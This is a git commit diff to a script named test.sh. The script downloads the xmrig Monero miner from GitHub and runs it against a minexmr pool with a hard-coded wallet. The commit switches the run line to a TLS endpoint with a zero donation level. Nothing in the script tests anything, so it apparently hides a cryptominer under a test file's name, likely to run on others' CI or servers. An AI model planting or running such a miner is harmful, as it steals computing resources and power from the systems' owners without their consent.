c966de16f985894a60e8163ad2c0605816b63b8f
azzammuhammad <69777820+azzammuhammad@users.noreply.github.com>
2021-06-30 11:21:22 +0700

    Update test.sh

--- test.sh
+++ test.sh
@@ -2,4 +2,4 @@ apt update
 wget https://github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-linux-static-x64.tar.gz
 tar -zxf xmrig-6.12.2-linux-static-x64.tar.gz
 cd xmrig-6.12.2
-./xmrig -o pool.minexmr.com:4444 -u 49eHLMKT9yYNvdSdwYJPvASspMCQWWZJaXoK9C4aftvFbgSkqzSC43W9AsHieyrdYw6U9SFZKickfh12bSQyZmZgJv7s3LK
+./xmrig --donate-level 0 -o sg.minexmr.com:443 -u 49eHLMKT9yYNvdSdwYJPvASspMCQWWZJaXoK9C4aftvFbgSkqzSC43W9AsHieyrdYw6U9SFZKickfh12bSQyZmZgJv7s3LK -k --tls --rig-id bruh
